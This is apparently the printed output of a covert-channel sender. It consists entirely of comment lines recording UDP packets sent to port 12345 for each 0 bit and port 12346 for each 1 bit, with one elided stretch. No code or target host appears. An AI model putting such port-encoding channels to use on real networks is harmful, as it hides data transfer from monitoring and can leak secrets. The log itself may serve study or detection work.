# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# ...
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
